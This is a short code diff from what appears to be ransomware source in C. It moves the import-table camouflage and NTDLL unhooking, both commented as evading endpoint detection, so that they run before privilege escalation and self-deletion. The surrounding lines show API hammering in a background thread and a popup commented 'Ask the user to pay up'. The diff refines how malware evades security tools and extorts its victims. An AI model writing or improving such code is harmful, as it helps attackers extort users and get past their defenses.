@@ -277,6 +277,15 @@ int main() {
 	}
 	printf("[+] Thread %d Was Created To Run ApiHammering In The Background\n", dwThreadId);
 
+	//Initiate IAT camouflage
+	IatCamouflage();
+	printf("[+] IAT Camouflage Done \n");
+
+	// Unhook NTDLL for EDR Evasion
+	if (!UnhookNtDLL()) {
+		printf("[!] Failed To Unhook NTDLL \n");
+	}
+
 	// Escalate the current process privileges
 	if (!DoPrivilegeEscalation()) {
 		printf("[!] Failed To Escalate Privileges \n");
@@ -287,15 +296,6 @@ int main() {
 		printf("[!] Failed To Delete Self Binary \n");
 	}
 	
-	//Initiate IAT camouflage
-	IatCamouflage();
-	printf("[+] IAT Camouflage Done \n");
-    
-	// Unhook NTDLL for EDR Evasion
-	if (!UnhookNtDLL()) {
-		printf("[!] Failed To Unhook NTDLL \n");
-	}
-
 	// Ask the user to pay up
 	ShowDownloadPopup();
 
